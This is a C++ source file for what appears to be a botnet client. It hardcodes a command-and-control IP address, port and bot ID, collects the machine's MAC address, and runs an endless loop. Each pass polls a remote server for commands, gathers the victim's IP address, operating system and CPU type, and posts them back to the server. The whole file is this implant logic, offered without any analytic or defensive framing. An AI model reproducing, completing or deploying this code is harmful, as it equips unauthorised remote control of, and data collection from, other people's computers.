#include "lib\DataCollector.h"
#include "lib\UtilLib.h"
#define FREQUENCY
#include <windows.h>
#include <strsafe.h>
#include <Windows.h>
#include <iostream>
#include "lib\ActionController.h"
#include "lib\HttpLib.h"
#include "lib\ThreadController.h"
#include <vector>

void handleAction();

char* GetOS();
char* GetIP();
char* GetProcessor();

#if defined(THREADING)
ThreadController tc;
#endif
int COUNT = 3;
#ifdef ENCODE_HTTP
	bool encode = true;
#else
	bool encode = false;
#endif
#pragma comment(lib, "ws2_32.lib")
DataCollector dc;
typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
ActionController ac;
typedef BOOL (WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);
vector<vector<string>> requestQueue;
#ifdef FREQUENCY
	int WAIT = 1;
#else
	int WAIT = 0;
#endif
#define BOTLOOP
int port = 50000;
#define REQ_COUNT
string url = "104.39.0.205";
char *BOT_ID = "EHA2tikcf5URRlh9Jci8fA4xX3t63RSd";

using namespace std;

int main(){
#if defined(BOTLOOP) || defined(EXECUTE)
char* MAC_ADDR = getMAC();
dc.addDataPair("bot_id", BOT_ID);
dc.addDataPair("mac_address", MAC_ADDR);
#endif

#ifdef EXECUTE
sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData(), WAIT);
dc.dumpCollectedData();
#endif
#ifdef BOTLOOP
string response = "";
struct Action action;
ac.addAction(action);
int reqCounter = 0;
while(1){
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	if (waitForTime(TIMEARRAY, sizeof(TIMEARRAY), COUNT)){
#endif
		response = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, dc.getGetData(), WAIT);
		action = ac.parseAction(response);
		ac.addAction(action);
		handleAction();
		reqCounter++;
		Sleep(3000);
		if(reqCounter % 1 == 0){
			sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData(), WAIT);
			dc.dumpCollectedData();
		}
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	}
#endif
}
#endif
#if defined THREADING
tc.closeAllThreads();
#endif
}

char* GetIP()
{
WSAData wsaData;
WSAStartup(MAKEWORD(2, 2), &wsaData);
HOSTENT* Host;
char hostname[128] = { 0 };
char* IPv4 = new char[128];
gethostname(hostname, 128);
Host = gethostbyname(hostname);
IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
WSACleanup();
return IPv4;
}
char* GetOS()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);
	if (!bOsVersionInfoEx){
#ifdef __APPLE__
		return "Mac";
#elif __linux__
		return "Linux";
#elif __unix__
		return "Unix";
#endif
		return "Other";
	}
	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), 
	"GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);
	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion == 6){
			if (osvi.dwMinorVersion == 0){
				if (osvi.wProductType == VER_NT_WORKSTATION)
					return "Windows Vista";
				else return "Windows Server 2008";
			}
			if (osvi.dwMinorVersion == 1 || osvi.dwMinorVersion == 2){
				if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 1)
					return "Windows 7";
				else
					if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 2)
						return "Windows 8";
					else return "Windows Server 2008 R2";
			}
		}
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2){
			if (osvi.wSuiteMask & VER_SUITE_WH_SERVER)
				return "Windows Home Server";
			else if (osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "Windows XP Professional";
			else return "Windows Server 2003";
		}
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
			return "Windows XP";
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
			return "Windows 2000";
		return "Windows";
	}
	else
		return "Other";
}
char* GetProcessor()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);
	if (!bOsVersionInfoEx) return "Not Determined";
	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);
	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion >= 6){
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "64-bit";
			else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
				return "32-bit";
		}
		else
			return "32-bit";
	}
	return "Not Determined";
}
void handleAction(){
struct Action action;
while(ac.hasAction()){
action = ac.getNextAction();
printf("action %s\n", action.action.c_str());
if(action.action == "Send IP Address"){
printf("doing action %s\n", action.action.c_str());
char *ip = GetIP();
dc.addDataPair("ip_address", ip);
}
if(action.action == "Send OS"){
printf("doing action %s\n", action.action.c_str());
char *os = GetOS();
dc.addDataPair("os", os);
}
if(action.action == "Send CPU"){
printf("doing action %s\n", action.action.c_str());
char *proc = GetProcessor();
dc.addDataPair("cpu", proc);
}
action = ac.getNextAction();
}
}
